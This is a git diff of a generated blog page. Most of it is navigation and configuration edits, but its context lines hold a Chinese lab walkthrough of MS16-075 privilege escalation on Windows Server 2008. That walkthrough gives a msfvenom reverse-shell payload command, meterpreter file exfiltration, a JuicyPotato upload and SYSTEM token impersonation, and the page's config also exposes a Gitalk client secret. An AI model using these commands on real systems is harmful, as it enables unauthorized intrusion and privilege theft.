@@ -127,49 +127,6 @@
     
   </li>
   
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="" class="waves-effect waves-light">
-
-      
-      <i class="fas fa-list" style="zoom: 0.6;"></i>
-      
-      <span>Medias</span>
-      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
-    </a>
-    <ul class="sub-nav menus_item_child ">
-      
-      <li>
-        <a href="/musics">
-          
-          <i class="fas fa-music" style="margin-top: -20px; zoom: 0.6;"></i>
-          
-          <span>Musics</span>
-        </a>
-      </li>
-      
-      <li>
-        <a href="/books">
-          
-          <i class="fas fa-book" style="margin-top: -20px; zoom: 0.6;"></i>
-          
-          <span>Books</span>
-        </a>
-      </li>
-      
-      <li>
-        <a href="/galleries">
-          
-          <i class="fas fa-image" style="margin-top: -20px; zoom: 0.6;"></i>
-          
-          <span>Galleries</span>
-        </a>
-      </li>
-      
-    </ul>
-    
-  </li>
-  
   <li>
     <a href="#searchModal" class="modal-trigger waves-effect waves-light">
       <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
@@ -270,51 +227,6 @@
 			
 			友情链接
 		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="javascript:;">
-			
-				<i class="fa-fw fas fa-list"></i>
-			
-			Medias
-			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
-		</a>
-            <ul  style="background:  ;" >
-              
-                <li>
-
-                  <a href="/musics " style="margin-left:75px">
-				  
-				   <i class="fa fas fa-music" style="position: absolute;left:50px" ></i>
-			      
-		          <span>Musics</span>
-                  </a>
-                </li>
-              
-                <li>
-
-                  <a href="/books " style="margin-left:75px">
-				  
-				   <i class="fa fas fa-book" style="position: absolute;left:50px" ></i>
-			      
-		          <span>Books</span>
-                  </a>
-                </li>
-              
-                <li>
-
-                  <a href="/galleries " style="margin-left:75px">
-				  
-				   <i class="fa fas fa-image" style="position: absolute;left:50px" ></i>
-			      
-		          <span>Galleries</span>
-                  </a>
-                </li>
-              
-            </ul>
           
         </li>
         
@@ -602,7 +514,7 @@
 <h4 id="开始动手"><a href="#开始动手" class="headerlink" title="开始动手"></a>开始动手</h4><p>1.假设是msfvenom生成木马，目标执行了，监听会话，获得meterpreter会话权限</p>
 <pre class="line-numbers language-bash"><code class="language-bash">msfvenom -p windows/meterpreter_reverse_tcp lhost<span class="token operator">=</span>192.168.0.103 lport<span class="token operator">=</span>4444 -f exe <span class="token operator">></span> shell.exe
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>2.先看一下当前权限(确保我没有作弊)<br><img src="/ms-16075提权Windows-Server-2008/20200509124400640_627306756.png" alt=""></p>
+<p>2.先看一下当前权限(确保我没有作弊)<br><img src="/posts/29481/20200509124400640_627306756.png" alt=""></p>
 <p>3.查看系统信息，并导出</p>
 <pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># (进入cmd)</span>
 shell
@@ -612,12 +524,12 @@ systeminfo <span class="token operator">>></span> c:\out.txt   将系统信息�
 <p>4.在meterpreter把结果文件下载到本地</p>
 <pre class="line-numbers language-bash"><code class="language-bash">download   D:\\xxxx\\upload\\out.txt   /tmp/out.txt    
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/ms-16075提权Windows-Server-2008/20200509124528657_693013081.png" alt=""></p>
+<p><img src="/posts/29481/20200509124528657_693013081.png" alt=""></p>
 <p>5.这里选择<code>Windows-Exploit-Suggeste</code>提权辅助工具，对结果文件在本地进行分析, 查找系统未打补丁有哪些</p>
 <pre><code>python windows-exploit-suggester.py --update
 python windows-exploit-suggester.py -i out.txt -d 2020-05-09-mssb.xls -l  # -i是systeminfo的结果文件
-</code></pre><p><img src="/ms-16075提权Windows-Server-2008/20200509125316572_1848701450.png" alt=""></p>
-<p>可以看到可能存在ms16-075漏洞<br><img src="/ms-16075提权Windows-Server-2008/20200509125428450_1124062040.png" alt=""></p>
+</code></pre><p><img src="/posts/29481/20200509125316572_1848701450.png" alt=""></p>
+<p>可以看到可能存在ms16-075漏洞<br><img src="/posts/29481/20200509125428450_1124062040.png" alt=""></p>
 <p>6.开始验证</p>
 <pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 上传ms16-075的exp: JuicyPotato.exe至靶机</span>
 upload /root/Desktop/JuicyPotato.exe  C:\\
@@ -626,11 +538,11 @@ execute -cH -f  C:\\JuicyPotato.exe    <span class="token comment" spellcheck="t
 impersonate_token <span class="token string">"NT AUTHORITY\\SYSTEM"</span>    <span class="token comment" spellcheck="true"># 窃取, 假冒目标主机上的可用令牌</span>
 
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/ms-16075提权Windows-Server-2008/20200509131028979_154968739.png" alt=""></p>
+<p><img src="/posts/29481/20200509131028979_154968739.png" alt=""></p>
 <p>7.查看当前权限，提取成功</p>
 <pre class="line-numbers language-bash"><code class="language-bash">getuid                <span class="token comment" spellcheck="true"># 查看当前权限</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/ms-16075提权Windows-Server-2008/20200509131235678_336913385.png" alt=""></p>
+<p><img src="/posts/29481/20200509131235678_336913385.png" alt=""></p>
 <p>8.后面的事情，嘿嘿你懂得</p>
 <blockquote>
 <p>这里只是没有防护的情况下的一次简单实验，有点简陋有点水</p>
@@ -897,8 +809,8 @@ impersonate_token <span class="token string">"NT AUTHORITY\\SYSTEM"</span>    <s
     let gitalk = new Gitalk({
         clientID: 'd75ec1a5864747376f6f',
         clientSecret: 'b4751152ca815e8e538c64da23e2a371fa1fb2db',
-        repo: 'https://github.com/shuai06/gittalks.git',
-        owner: 'SHUAI06',
+        repo: 'hexo-gitalk',
+        owner: 'shuai06',
         admin: "shuai06",
         id: '2020-05-09T11-25-16',
         distractionFreeMode: false  // Facebook-like distraction free mode
@@ -1100,10 +1012,6 @@ impersonate_token <span class="token string">"NT AUTHORITY\\SYSTEM"</span>    <s
 
 
 <!-- 代码块折行 -->
-
-<style type="text/css">
-code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
-</style>
 
 
     </div>
